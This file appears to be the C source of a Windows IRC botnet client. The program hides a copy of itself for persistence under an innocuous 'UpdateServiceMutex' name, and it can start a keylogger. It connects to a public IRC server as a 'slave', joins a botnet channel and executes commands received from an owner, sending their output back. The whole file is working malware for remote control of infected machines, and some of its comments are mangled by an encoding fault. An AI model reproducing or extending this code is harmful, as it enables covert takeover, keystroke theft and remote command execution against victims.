#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include "header.h"

HANDLE hMutex;

BOOL is_already_running() {
    hMutex = CreateMutexW(NULL, FALSE, L"Global\\UpdateServiceMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        bot_log("[!] Another instance is already running.\n");
        return TRUE;
    }
    return FALSE;
}

int extract_nick(const char* buf, char* nick, size_t size) {
    if (buf == NULL || nick == NULL || size == 0)
        return -1;

    if (buf[0] != ':') {
        // Ĭ��ֵ��#mybotnet123123
        strncpy(nick, "#mybotnet123123", size);
        nick[size - 1] = '\0';  // ȷ���ַ�������
        return -1;  // ���� -1 ��ʾδ��ȡ�ɹ�����������Ĭ��ֵ
    }

    const char* end = strchr(buf, '!');
    if (end == NULL || end - buf < 2) {
        // Ĭ��ֵ��#mybotnet123123
        strncpy(nick, "#mybotnet123123", size);
        nick[size - 1] = '\0';
        return -1;
    }

    size_t len = end - buf - 1;
    if (len >= size)
        len = size - 1;

    memcpy(nick, buf + 1, len);
    nick[len] = '\0';

    return 0;
}


const char* version = "bot 1.0";
MessageBuffer msgBuffer;
SOCKET ircsock;
 
int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
{

    init_log_path();
    bot_log("version :%s",version);


    if (!is_hidden_bot() && HIDE_ON_ENTRY) {
        bot_log("Starting to hide myself...\n");
        if (copy_and_hide_bot() == 0) {
            bot_log("[+] Copy and Hide Succeed, exiting...");
            WSACleanup();
            return 0;
        }
        else {
            bot_log("[!] Copy and Hide Failed, continue without persistence.");
        }

    }

    if (is_already_running())
        exit(0);

    char owner[64] = {0};
    strcpy(owner, "#mybotnet123123");
    const char* channel = "#mybotnet123123";
    int reconnectAttempts = 0;


    while (1) 
    {
        ircsock = TCPhandler("irc.libera.chat", "slave");
        if (ircsock == INVALID_SOCKET) {
            bot_log("Failed to connect to IRC server. Attempt %d of %d...\n",
                reconnectAttempts + 1, MAX_RECONNECT_ATTEMPTS);
            reconnectAttempts++;
            Sleep(RECONNECT_INTERVAL);
            continue;
        }

        if (join_channel(channel) != 0)
            continue;

#ifdef KEYLOG_ON_ENTRY
        start_keylog();
#endif

        char buf[DEFAULT_BUFLEN];
        time_t last_ping = time(NULL);



        while (1)
        {
            // ʹ�� select ���ó�ʱ����
            struct timeval timeout;
            timeout.tv_sec = 5;   // ��ʱʱ�䣺5 ��
            timeout.tv_usec = 0;

            fd_set readSet;
            FD_ZERO(&readSet);
            FD_SET(ircsock, &readSet);

            int activity = select(0, &readSet, NULL, NULL, &timeout);

            if (activity == SOCKET_ERROR) {
                bot_log("Select error: %d\n", WSAGetLastError());
                break;
            }
            else if (activity == 0) {
                // ��ʱ��û�����ݵ���
                continue;
            }

            int n = recv(ircsock, buf, sizeof(buf) - 1, 0);
            if (n <= 0) {
                bot_log("Connection closed by server.\n");
                closesocket(ircsock);
                break;
            }

            buf[n] = '\0';  // Null-terminate
            bot_log("Raw: %s", buf);


            // ���� PING/PONG
            if (strncmp(buf, "PING", 4) == 0) {
                char pong[512];
                snprintf(pong, sizeof(pong), "PONG%s\r\n", buf + 4);
                send(ircsock, pong, (int)strlen(pong), 0);
                last_ping = time(NULL);
                continue;
            }

            if (strstr(buf, "Excess Flood") ||
                strstr(buf, "Ping timeout") ||
                strstr(buf, "Connection reset") ||
                strstr(buf, "ERROR :Closing link") ||
                strstr(buf, "ERROR :") ||         // ƥ������ ERROR ����
                strstr(buf, "Killed (")) {        // �û����߳�
                bot_log("Detected disconnection: %s\n", buf);
                closesocket(ircsock);
                break;
            }

            // ���� PRIVMSG
            char* privmsg = strstr(buf, "PRIVMSG");
            if (privmsg != NULL) {
                last_ping = time(NULL);
                if (extract_nick(buf, owner, sizeof(owner)) != 0) {
                    bot_log("[-] Owner extract fail ,using default owner: %s", owner);
                }
                

                // ������Ϣ������ʼλ�ã���һ�� ':' ��
                char* colon = strchr(privmsg, ':');
                if (colon != NULL) {
                    char* command = colon + 1;

                    char ansiCommand[DEFAULT_BUFLEN]; 
                    int res = Utf8ToAnsi(command, ansiCommand, sizeof(ansiCommand));
                    if (res < 0) {
                        bot_log("Error converting UTF-8 to ANSI: %d\n", res);
                        continue; // ת��ʧ�ܣ�����������
                    }

                    // ��ת�����ANSI�ַ�������ԭʼcommand
                    command = ansiCommand;


                    // ȥ��ǰ��հ��ַ�
                    char* end = command + strlen(command);
                    while (end > command && (*(end - 1) == '\r' || *(end - 1) == '\n' || *(end - 1) == ' '))
                        end--;
                    *end = '\0';

                    initMessageBuffer(&msgBuffer, owner);

                    // ������ִ������
                    ParsedCommand parsedCmd = parsecommand(command);
                    char* result = execute_parsed_command(parsedCmd, ircsock);

                    if (result) {
                        char* resultCopy = strdup(result);
                        char* token;
                        char* context = NULL;
                        token = strtok_s(resultCopy, "\n", &context);

                        while (token != NULL) {
                            appendToBuffer(&msgBuffer, ircsock, token);
                            token = strtok_s(NULL, "\n", &context);
                        }

                    
                        flushBuffer(&msgBuffer, ircsock);

                        free(resultCopy);
                        free(result);
                    }
                }
            }

            memset(buf, 0, sizeof(buf));

            if (difftime(time(NULL), last_ping) > PING_TIMEOUT) {
                bot_log("No message received from server for %d seconds. Reconnecting...\n", PING_TIMEOUT);
                closesocket(ircsock);
                break;
            }
        }

        Sleep(RECONNECT_INTERVAL);
    }

    WSACleanup();
    return 0;
}